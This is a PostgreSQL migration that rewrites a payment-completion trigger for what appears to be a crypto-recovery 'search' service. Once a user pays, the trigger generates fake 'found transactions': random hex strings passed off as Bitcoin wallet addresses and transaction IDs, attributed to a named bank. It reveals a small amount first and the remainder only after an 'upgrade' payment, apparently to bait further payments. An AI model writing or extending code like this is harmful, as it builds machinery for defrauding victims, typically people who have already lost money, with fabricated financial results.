/*
  # Update Payment Trigger for Small Initial Transaction

  1. Changes
    - Modify initial transaction to be between 0.02% and 0.05%
    - Add min/max amount constraints (€200-€1000)
    - Update remaining amount distribution
    - Fix wallet address generation

  2. Security
    - Maintain existing RLS policies
    - Ensure data integrity
*/

-- Update the payment completion trigger function
CREATE OR REPLACE FUNCTION handle_payment_completion()
RETURNS TRIGGER AS $$
DECLARE
    existing_transactions jsonb;
    total_amount numeric;
    remaining_amount numeric;
    initial_amount numeric;
    initial_percentage numeric;
    new_transactions jsonb;
    first_transaction jsonb;
    btc_price numeric := 53000;
    current_search record;
BEGIN
    -- If payment status changes to finished or confirmed
    IF NEW.status IN ('finished', 'confirmed') AND OLD.status != NEW.status THEN
        -- Get current search state
        SELECT * INTO current_search
        FROM search_results
        WHERE user_id = NEW.user_id
        ORDER BY created_at DESC
        LIMIT 1;

        -- Get the total transaction amount
        SELECT amount INTO total_amount
        FROM transactions
        WHERE user_id = NEW.user_id
        ORDER BY created_at DESC
        LIMIT 1;

        -- Handle transactions based on payment type
        IF NEW.is_upgrade THEN
            -- For upgrades, keep the first small transaction
            first_transaction := current_search.found_transactions->0;
            
            -- Calculate remaining amount to distribute
            remaining_amount := total_amount - (first_transaction->>'amount')::numeric;
            
            -- Split remaining amount into two transactions (45% and 55% of remaining)
            new_transactions := jsonb_build_array(
                first_transaction,
                jsonb_build_object(
                    'amount', ROUND((remaining_amount * 0.45)::numeric, 2),
                    'bitcoinAmount', ROUND((remaining_amount * 0.45 / btc_price)::numeric, 8),
                    'transactionId', 'bc1' || encode(gen_random_bytes(32), 'hex'),
                    'bankEmail', 'support@digitalchainbank.com',
                    'bankAddress', 'Avenida Balboa, Edificio 121, Bella Vista',
                    'walletAddress', 'bc1' || encode(gen_random_bytes(32), 'hex')
                ),
                jsonb_build_object(
                    'amount', ROUND((remaining_amount * 0.55)::numeric, 2),
                    'bitcoinAmount', ROUND((remaining_amount * 0.55 / btc_price)::numeric, 8),
                    'transactionId', 'bc1' || encode(gen_random_bytes(32), 'hex'),
                    'bankEmail', 'support@digitalchainbank.com',
                    'bankAddress', 'Avenida Balboa, Edificio 121, Bella Vista',
                    'walletAddress', 'bc1' || encode(gen_random_bytes(32), 'hex')
                )
            );
        ELSE
            -- For new payments, calculate initial small transaction
            -- Random percentage between 0.02% and 0.05%
            initial_percentage := (random() * (0.0005 - 0.0002) + 0.0002);
            initial_amount := ROUND((total_amount * initial_percentage)::numeric, 2);
            
            -- Enforce min/max limits
            IF initial_amount < 200 THEN
                initial_amount := 200;
            ELSIF initial_amount > 1000 THEN
                initial_amount := 1000;
            END IF;

            -- Create initial transaction
            new_transactions := jsonb_build_array(jsonb_build_object(
                'amount', initial_amount,
                'bitcoinAmount', ROUND((initial_amount / btc_price)::numeric, 8),
                'transactionId', 'bc1' || encode(gen_random_bytes(32), 'hex'),
                'bankEmail', 'support@digitalchainbank.com',
                'bankAddress', 'Avenida Balboa, Edificio 121, Bella Vista',
                'walletAddress', 'bc1' || encode(gen_random_bytes(32), 'hex')
            ));
        END IF;

        -- Update search results
        UPDATE search_results
        SET 
            payment_status = 'completed',
            payment_completed_at = NOW(),
            status = CASE 
                WHEN NEW.is_upgrade THEN status -- Keep current status for upgrades
                ELSE 'searching'
            END,
            search_started_at = CASE 
                WHEN NEW.is_upgrade THEN search_started_at -- Keep current start time for upgrades
                ELSE NOW()
            END,
            search_completed_at = CASE 
                WHEN status = 'searching' OR NOT NEW.is_upgrade THEN
                    CASE 
                        WHEN NEW.tier = 'pro' THEN NOW() + INTERVAL '72 hours'
                        WHEN NEW.tier = 'enterprise' THEN NOW() + INTERVAL '168 hours'
                        ELSE NOW() + INTERVAL '12 hours'
                    END
                ELSE search_completed_at
            END,
            tier = NEW.tier,
            ai_assistance = CASE 
                WHEN NEW.tier IN ('pro', 'enterprise') THEN true 
                ELSE false 
            END,
            search_progress = CASE 
                WHEN NEW.is_upgrade THEN search_progress -- Keep progress for upgrades
                ELSE 0
            END,
            found_transactions = new_transactions
        WHERE id = current_search.id;
    END IF;
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

-- Drop and recreate the trigger
DROP TRIGGER IF EXISTS payment_completion_trigger ON payments;
CREATE TRIGGER payment_completion_trigger
    AFTER UPDATE ON payments
    FOR EACH ROW
    EXECUTE FUNCTION handle_payment_completion();